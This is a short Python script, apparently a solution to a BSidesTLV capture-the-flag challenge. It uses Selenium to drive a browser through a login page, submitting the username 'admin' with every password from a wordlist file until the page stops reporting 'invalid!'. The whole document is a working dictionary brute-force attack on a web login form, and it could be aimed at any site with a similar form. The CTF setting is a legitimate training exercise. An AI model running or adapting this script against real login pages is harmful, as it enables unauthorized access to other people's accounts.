#!/usr/bin/python3

# -*- coding: utf-8 -*-
# @Author: logan47
# @Date:   2019-06-13 22:10:08
# @Last Modified by:   logan47
# @Last Modified time: 2019-06-26 21:11:15

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import os
import time


chrome_options = Options()
# chrome_options.add_argument("--headless")
chrome_options.add_argument("--window-size=1024x1400")

driver = webdriver.Chrome(chrome_options=chrome_options)
i=0
with open("passwords.txt") as fp:
	for _,line in enumerate(fp):
		pas = line.strip()
		print(str(i)+". for pass: "+pas)
		driver.get("http://recaptcha.challenges.bsidestlv.com/")
		# assert "GitHub".lower() in driver.title.lower()

		# scrap info
		username = driver.find_element_by_id("username")
		username.send_keys("admin")
		password = driver.find_element_by_id("password")
		password.send_keys(pas)
		button = driver.find_element_by_css_selector('.fourth').click()
		i = i+1
		
		time.sleep(2)
		
		result = driver.find_element_by_id("result")
		print(result.text)

		if "invalid!" not in result.text:
			break
